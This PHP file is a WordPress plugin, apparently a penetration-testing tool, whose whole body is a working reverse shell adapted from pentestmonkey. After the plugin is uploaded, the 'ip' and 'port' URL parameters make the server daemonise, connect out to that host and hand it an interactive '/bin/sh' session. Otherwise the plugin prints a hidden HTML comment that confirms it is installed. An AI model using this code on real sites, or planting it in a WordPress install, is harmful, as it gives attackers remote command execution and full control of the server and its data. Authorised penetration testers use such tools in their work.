<?php
/**
 * Note to User/Tester: Zip Me and Upload
 * Plugin Name: SiC WP Plugin
 * Plugin URI: https://www.getrekt.com/EpicWP/
 * Description: Adds Pwnage to WordPress - add ?ip=&port= parameter arguments. - Finding $iCn3$$ is H3r3 comment in the site validates successfully loaded plugin. Modified version from pentestmonkey.net that doesn't take down the WP Site but adds a comment and logs output to javascript console.log.
 * Author: SiCiNtHeMiNd (h/t Pentestmonkey.net)
 * Author URI: https://www.getrekt.com/
 * Version: 1.0
 *
 * Copyright: (c) 2019 SiC (SiC@SiCiNtHeMiNd.com)
 *
 * License: GNU General Public License v3.0
 * License URI: http://www.gnu.org/licenses/gpl-3.0.html
 *
 * @author    SiCiNtHeMiNd
 * @copyright Copyright (c) 2019, SiC.
 * @license   http://www.gnu.org/licenses/gpl-3.0.html GNU General Public License v3.0
 *
 */
if (isset($_GET["ip"])){
	$ip = htmlspecialchars($_GET["ip"]); 
} else {
	if (isset($argv[1])) {
		$ip = htmlspecialchars($argv[1]);
		echo "IP Set to: $ip\n";
	}
}
if (isset($_GET["port"])){ 
	$port = htmlspecialchars($_GET["port"]); 
} else {
	if (isset($argv[2])) {
		$port = htmlspecialchars($argv[2]); 
		echo "Port Set to: $port\n";
	}
}
set_time_limit (0);
$VERSION = "1.0";
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (isset($ip) && isset($port)) {
	if (function_exists('pcntl_fork')) {
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		
		if ($pid) {
			exit(0);  // Parent exits
		}

		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}

		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}

	chdir("/");

	umask(0);
	
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}

	$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
	$process = proc_open($shell, $descriptorspec, $pipes);
	if (!is_resource($process)) {printit("ERROR: Can't spawn shell");exit(1);}

	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);

	printit("Successfully opened reverse shell to $ip:$port");

	while (1) {
		if (feof($sock)) { printit("ERROR: Shell connection terminated"); break;}
		if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}

	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);

} else {
    echo "<!-- \$iCn3$$ is H3r3 -->";
}
function printit ($string) { if (!$daemon) { print "<script type=\"text/javascript\">console.log('$string')</script>";}}

?> 
